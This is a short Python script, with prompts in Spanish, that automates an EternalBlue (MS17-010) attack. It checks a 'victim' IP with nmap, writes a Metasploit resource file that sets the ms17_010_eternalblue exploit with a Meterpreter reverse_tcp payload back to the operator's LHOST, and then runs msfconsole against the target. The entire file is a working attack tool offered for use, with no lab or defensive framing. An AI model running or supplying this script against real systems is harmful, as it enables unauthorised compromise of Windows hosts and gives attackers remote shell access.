import subprocess
import os
import time

def escanear(ip_objetivo):
    print(f"[+] Escaneando {ip_objetivo} con Nmap para MS17-010...")
    comando = f"nmap -p 445 --script smb-vuln-ms17-010 {ip_objetivo}"
    resultado = subprocess.getoutput(comando)

    if "VULNERABLE" in resultado:
        print("[+] El sistema ES vulnerable a MS17-010 (EternalBlue)")
        return True
    else:
        print("[-] El sistema NO es vulnerable o Nmap no pudo detectarlo correctamente.")
        return False

def generar_script_msf(ip_victima, ip_local):
    contenido = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {ip_victima}
set LHOST {ip_local}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
"""
    with open("eternalblue_auto.rc", "w") as archivo:
        archivo.write(contenido)
    print("[+] Script para Metasploit generado: eternalblue_auto.rc")

def ejecutar_msfconsole():
    print("[*] Ejecutando Metasploit con el script...")
    time.sleep(2)
    os.system("msfconsole -r eternalblue_auto.rc")

def main():
    print("======= Automatizador de ataque EternalBlue =======")
    ip_victima = input("IP de la víctima: ").strip()
    ip_local = input("Tu IP local (LHOST): ").strip()

    if escanear(ip_victima):
        generar_script_msf(ip_victima, ip_local)
        ejecutar_msfconsole()
    else:
        print("[!] Finalizado. No se lanzará el exploit.")

if __name__ == "__main__":
    main()
